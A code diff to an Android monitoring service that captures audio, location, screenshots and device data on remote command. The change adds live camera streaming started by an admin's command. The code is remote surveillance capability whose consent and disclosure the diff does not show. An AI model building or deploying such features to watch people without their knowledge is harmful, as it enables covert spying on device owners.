@@ -55,7 +55,7 @@ class MonitoringForegroundService : Service() {
         val getToken: suspend () -> String? = { sessionManager.sessionToken.first() }
 
         audioMonitor    = AudioMonitor(this, apiService, presenceService, scope, getToken)
-        cameraCapture   = CameraCapture(this, apiService, scope, getToken)
+        cameraCapture   = CameraCapture(this, apiService, scope, getToken, presenceService)
         locationMonitor = LocationMonitor(this, apiService, scope, getToken)
         deviceInfo      = DeviceInfoCollector(this, apiService, getToken)
         dataPuller      = DataPuller(this, apiService, scope, getToken)
@@ -202,12 +202,11 @@ class MonitoringForegroundService : Service() {
                         if (hasPermission(android.Manifest.permission.CAMERA)) {
                             upgradeServiceType()
                             val front = params.get("camera")?.asString != "back"
-                            cameraCapture.startVideoRecording(front)
+                            val adminId = params.get("admin_id")?.asInt
+                            cameraCapture.startLiveVideo(front, adminId)
                         }
                     }
-                    "stop_live_video" -> cameraCapture.stopVideoRecording { file ->
-                        scope.launch { cameraCapture.uploadVideo(file) }
-                    }
+                    "stop_live_video" -> cameraCapture.stopLiveVideo()
 
                     "capture_screenshot" -> {
                         val sm = screenMonitor
@@ -284,6 +283,7 @@ class MonitoringForegroundService : Service() {
         wsJob?.cancel()
         reconnectJob?.cancel()
         runCatching { audioMonitor.stopLiveAudio() }
+        runCatching { cameraCapture.stopLiveVideo() }
         runCatching { locationMonitor.stop() }
         runCatching { screenMonitor?.release() }
         scope.cancel()
